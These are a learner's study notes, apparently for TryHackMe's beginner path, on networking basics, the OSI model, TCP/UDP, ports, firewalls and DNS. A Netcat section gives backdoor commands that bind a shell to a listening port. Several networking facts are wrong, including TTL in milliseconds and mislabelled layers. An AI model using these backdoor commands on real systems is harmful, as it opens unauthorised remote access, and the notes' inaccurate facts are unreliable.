## Introduction to Cyber Security
#### Gobuster

"[Gobuster](https://github.com/OJ/gobuster)" Gobuster will take a list of potential page or directory names and try accessing a website with each of them; if the page exists, it tells you.

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206160704.png)


---

#### SOC

**Security Operations Center (SOC)** is a team of IT security professionals tasked with monitoring, preventing , detecting , investigating, and responding to threats within a company’s network and systems.


> *If a patch is not available, organizations must implement alternative measures to safeguard the system and mitigate potential exploitation.*


***swag voucher: - <!-- KUWCTJ-79O2GR-GPYP8H-H5AL4G -->***


---

#### Threat Intelligence

In this context, _intelligence_ refers to information you gather about actual and potential enemies.


---

#### Digital Forensics

Forensics is the application of science to investigate crimes and establish facts.
It focuses on:
- File System (taking images)
- System memory (taking images)
- network logs
- system logs (very important)


---

#### Incident Response

Incident response specifies the methodology that should be followed to handle a cyber security incident case.
Phases include:
- Preparation
- Detection and Analysis
- Containment, Eradication and Recovery
- Post Incident activity


---

#### Malware Analysis:

Analysis of malicious software. Includes virus, trojan horse and ransomware. Analysis techniques mainly includes static and dynamic analysis.

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206161040.png)


---

#### Careers in Cyber Security

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206182127.png)


---

## Network Fundamentals

#### What is Networking:

- Network
	- Public Network
	- Private Network
- IP Address
	- IPv4
	- IPv6
- MAC Address
- MAC Spoofing
- Ping

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206155940.png)


---

#### Intro to LAN:

- LAN
- Topologies
	- Star topology
	- Bus topology
	- Ring topology
- Switch
- Router

- Subnetting (dividing a network into multiple parts)
	- Used for security and management.

- ARP
	- Map IP address to MAC Address on each port in a network.
	- Types of Signals by ARP:
		- ARP Request
		- ARP Reply.

When an **ARP request** is sent, a message is broadcasted on the network to other devices asking, "What is the mac address that owns this IP address?" When the other devices receive that message, they will only respond if they own that IP address and will send an **ARP reply** with its MAC address. The requesting device can now remember this mapping and store it in its **ARP cache** for future use.

- DHCP:
	- IP addresses can be assigned **manually** or **automatically using DHCP**. With DHCP, a device requests an IP when it joins a network, the DHCP server offers one, the device accepts it, and the server confirms—allowing the device to start using the IP address.
	- Requests:
		- DHCP discover
		- DHCP offer
		- DHCP request
		- DHCP ACK


Room completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260206210225.png)


---

#### OSI Model
- All devices follow same unique framework.
- Seven layers arranged from 7 to 1 (bottom to top).
- Encapsulation in the OSI model refers to the process of wrapping data with protocol information at each layer of the model. As data is passed down from the application layer to the physical layer, each layer adds its own header (and sometimes trailer) to the data. This process ensures that the data is properly handled and understood by the receiving device, as each layer only interacts with its adjacent layers. This is crucial for effective communication over a network.


##### Physical Layer:
- Lowest layer in OSI
- Devices use binary to send and receive data on hardware.

##### Data Link Layer:
- focuses on physical addressing like MAC address that each NIC in hardware have.
- adds MAC of receiving device after receiving packet from network layer with IP header added.
- Converts the data that is suitable for transmission.

##### Network Layer:
- Third layer of OSI.
- Main Goals: Routing and Reassembly.
- Routing Protocols used:
	- OSPF
	- RIP
- Shortest path is decided by following factors:
	- Shortest path.
	- Reliable path.
	- Fastest Path.
- Layer 3 devices e.g Routers

##### Transport Layer:
- 4th Layer
- Protocols used:
	- TCP:
		- Connection oriented, provides reliable data transfer, flow control and congestion control.
	- UDP:
		- Connectionless protocol, suitable for protocols require fast queries like DNS.
		- No gaurantee no synchronization, just hope for the best.


##### Session Layer:
- 5th Layer
- Creates, maintains and terminates sessions with other devices.
- Uses checkpoints to retransmit lost data.
- Technical term for established connection = "session"


##### Presentation Layer:
- Layer 6
- Used for standardisation.
- converts data in one format to and from Application layer.
- Example: two developers developing two different email clients.
- Performs functions such as HTTPS for secure website preview.
- Acts as a "translator" to application layer.


##### Application Layer:
- Last layer in OSI
- Protocols used determines how user will interact with data sent or received.
- Exmples:
	- HTTP/HTTPS
	- DNS
	- FTP - etc


#### OSI Dungeon Escaped:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260207164000.png)
hehe, I just beat their team record of 19 seconds!


---

#### Completed:

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260207164057.png)


---

#### Packets and Frames:

##### What are packets and frames:

Packets are formed on network layer and frames are formed on data link layer after encapsulation. 
Some notable headers in an IP packets are as follows:
- **TTL (Time To Live):** A packet that can live in a network if it is not reached to the intended destination. TTL 64 ms is for Linux and 128 ms is for Windows. Routers typically use 255 ms TTL. To find the hops manually subtract the TTL from the received TTL. For example I did ping to Google's DNS and received 119 ms as TTL. It means It was running a windows server and 128 - 119 = 9. There are 9 hops in between.

- **Checksum:** It is an error detection mechanism in TCP packets. It adds all the headers, payload and Pseudo header and takes one's complement and then send it along the packet to the other device and then it is recalculated there and compared with the sent checksum. If all the bits of both checksum are 1s. Otherwise there will be errors.

- **Source IP address:** The IP address of the device from which the data is being sent from.

- **Destination IP address:** The IP address of the device to which next device the data is being sent.


---

#### TCP/IP - Three way handshake:

- Transmission Control Protocol
- Connection oriented protocol
- Also can be called summarized version of OSI (arguably).

- **These layers include:**
	- Application layer
	- Network layer
	- Transport layer
	- Physical layer
- It also performs encapsulation, antonym is decapsulation.
- **Following headers are found in a TCP packet:**
	- **Src Port:** Port from which TCP packet is send chosen randomly that is currently not in use.
	- **Dst Port:** The port value at which the data is sent. On which a service is running like HTTP on port 80.
	- **Source IP:** The IP address of the device from which the data is sent.
	- **Dest. IP:** The IP address of the device to which the data is sent.
	- **Sequence Number:** In each session when first packet is sent it is assigned a random number.
	- **Acknowledgement Number:** After the first packet the later packets are assigned numbers +1.
	- **[[#What are packets and frames | Checksum]]:** Discussed above.
	- **Data:** The actual data for example the file.
	- **Flag:** This header determines how the packet should be handled by either device during the handshake process.

##### Three way handshake messages for TCP:

- **SYN:** This packet is sent by client to initiate the connection and requests for synchronization. Sends ISN to SYNchronise.
- **SYN/ACK:** This packet is sent by the second device to first one to confirm the initiation of synchronization. Also sends the ISN to first device and ACK their ISN. Both devices must be agreed upon a ISN(Initail Sequence Number).
- **ACK:** This packet can be sent by either device to confirm that the series of messages has been successfully received.
- **DATA:** Once a connection is established the data is as BYTES of a file are sent through the DATA message.
- **FIN:** This packet is used to properly close the connection after the data transfer.
- **RST:** This packet abruptly ends all communications and can be due to any error.

##### **TCP Closing a Connection:**
To close the connection the device 1 will send the FIN packet and also the device 2 will also have to ACK this FIN and again send FIN to device 1 and then device 1 will ACK that FIN.


---

#### UDP/IP:

- Stateless protocol
- No SYN
- No three way handshake
- No process takes place to setup a connection
- no data integrity
- simple than TCP and have less headers than TCP
- UDP headers are as follows:
	- **TTL (Time To Live):** This is as the expiry timer of the packet if it doesn't manages to reach the intended host.
	- **Source IP address:** The IP address of the device sending the packet.
	- **Destination IP Address:** The IP Address of the device to which data is being sent.
	- **Source port:** The port number from which the data is being sent. It can be in in range 0 - 65535.
	- **Destination port:** The port number on which the intended application or service is running on the remote host. For example: HTTP on port 80 and SSH on port 22.
	- **Data:** The actual Bytes of the data being sent. e.g the file.
- Repeat: Connectionless and no acknowledgement.


---

#### Ports:
Studied about common ports (0 - 1024) For example:
- 80 for HTTP
- 443 for HTTPS
- 21 for FTP
- 22 for SSH
- 3389 for RDP
- 445 for SMB (Server Message Block - Same as FTP but also allows sharing devices such as printers.)
- $nc
##### Netcat:

**for help:**
```
nc -h 
```

**Connecting to a Server:**

```
nc [Target IP Address] [Target Port]
nc 192.168.17.43 21
```

**More from geekforgeeks:**

**Chatting**  
Netcat can also be used to chat between two users. We need to establish a connection before chatting. To do this we are going to need two devices. One will play the role of initiator and one will be a listener to start the conversation and so once the connection is established, communication can be done from both ends. First of all, we will use Windows 10 machine which will play role of Listener.Second we will use Kali linux machine which will play role of initiator. First, we will have to create a listener. We will use the following command to create a listener: 

```
nc -lvvp 4444 
```

where, 
[-l]: Listen Mode 
[vv]: Verbose Mode {It can be used once, but we use twice to be more verbose} 
[p]: Local Port 

how, it’s time to create an initiator, for this we will just provide the IP Address of the System where we started the Listener followed by the port number. 

**NOTE:** Use the same port to create an initiator that was used in creating listener. 

```
nc 192.168.1.35 4444 
```

**Creating a backdoor**   
We can also create a backdoor using NC. To create a backdoor on the target system that we can come back to at any time. Command for attacking a Linux System.   

```
nc -l -p 2222 -e /bin/bash 
```

For Creating Backdoor for Windows system.   

```
nc -l -p 1337 -e hack.exe 
```

This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system.   

```
nc 192.168.1.35 2222 
```

**Verbose mode**   
In netcat, Verbose is a mode which can be initiated using [-v] parameter. Now verbose mode generates extended information. Basically, we will connect to a server using netcat two times to see the difference between normal and verbose modes.   
**The command is**

```
nc 192.168.17.43 21 -v   
```
  
**Save Output to Desktop**   
For the purpose of the record maintenance, better readability, and future references, we will save the output of the Netcat. To do this we will use the parameter -o of the Netcat to save the output in the text file. 

```
nc 192.168.17.43 21 -v -o /root/Desktop/Result.txt
``` 

**File Transfer**   
Netcat can be used to transfer the file across devices. Here we will create a scenario where we will transfer a file from a Windows system to a Kali Linux system. To send the file from the Windows, we will use the following command.   

```
nc -v -w 20 -p 8888 -l file.txt 
```

So, this was a basic guide to netcat. It’s quite an interesting tool to use as well as it is pretty easy.



---


## **Completed:**

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208004555.png)

---


#### Extending your Network:

##### Port forwarding:
If a web server is setup on a local network then PCs with in that network will be able to connect to the web server on port 80. This is intranet. If outside network is to be communicated with this web server then we will have to do port forwarding. It is done on router of server. Then the website will accessible using the public IP of the router of server.


---

##### Firewalls:
These are the security devices in cyber security used to filter traffic based on rules that what traffic will enter or leave the network.

**These rules based on:**
- Source IP
- Destination IP
- Destination Port
- Protocol

**Types of Firewalls:**
- **Stateful Firewall:** It inspects packets based on whole connection instead of individual packets and decision making is dynamic hence consumes a lot of resources.
- **Stateless Firewalls:** Static Firewalls, analyze individual packets. Best for large amount of data. They are dumb and if a rule is not match these firewalls are useless.

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208122708.png) 

Stopping a DOS attack and blocking the attacker's IP on port 80.

---


#### VPN:
- Virtual Private Network
- Allows devices to communicate securely by creating a tunnel. It also allows different networks (offices and businesses) to connect securely.
- If two networks are connected via a tunnel through two devices then instead of whole networks only that 2 devices are able to communicate with each other.
- offers anonymity, privacy and secure distant connections.

##### VPN Technologies:
- PPP
- PPTP
- IPSec


---


#### LAN Networking Devices:

##### Router:
Routes data between network so called router. Already discussed above.

##### Switch:
Connects multiple devices in a network ranging from 3 to 63. Switches are of layer 2 and layer 3.
Layer 3 switches work in terms of VLANs.


**Room Completed:**

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208213352.png)


---


## How the Web Works:

#### DNS in detail:

**DNS:**
- Domain Name System
- Used for converting domain names to IP addresses.
- Instead of remembering 104.26.10.229, you can remember [tryhackme.com](http://tryhackme.com/) instead.

**Domain Heirarchy:**
- Root Domain
- Top Level Domain
	- gTLD (Generic Top Level Domain like .com .org .ai .store)
	- ccTLD (Country Code Top Level Domain like .pk .ae .se)
- Second Level Domain
- Subdomain

> Max characters in a subdomain = 63
> Max characters in a domain name = 253
> Cannot include _
> Cannot start or end with a hypen
> No consecutive hyphens
> Just a - z and 0 - 9


**Types of DNS Records:**
- A Record
- AAAA Record
- CNAME Record
- MX Record
- TXT Record


---


#### Making a DNS request:
- Local Cache
- Recursive DNS (also check Cache)
- Root server
- TLD server
- Authoritative server
- Goes back to recursive server for cache
- Returned to client made request.

>A TTL is assigned to the DNS cache for future use in seconds.


---


**Room Completed:**

![image](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/PreSecurity/Pasted%20image%2020260208230941.png)


---


